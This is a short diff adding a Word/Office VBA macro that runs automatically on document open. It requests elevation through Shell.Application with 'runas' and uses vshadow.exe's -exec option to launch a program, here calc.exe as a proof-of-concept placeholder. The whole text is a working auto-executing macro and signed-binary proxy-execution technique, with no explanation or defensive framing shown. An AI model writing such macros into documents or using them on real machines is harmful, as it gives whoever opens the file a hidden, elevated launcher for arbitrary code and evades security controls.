@@ -1,0 +1,6 @@
+Private Sub Document_Open()
+
+Set oShell = CreateObject("Shell.Application")
+oShell.ShellExecute "cmd.exe", "/c vshadow.exe -nw -exec=c:\windows\system32\calc.exe c:\", , "runas", 1
+
+End Sub
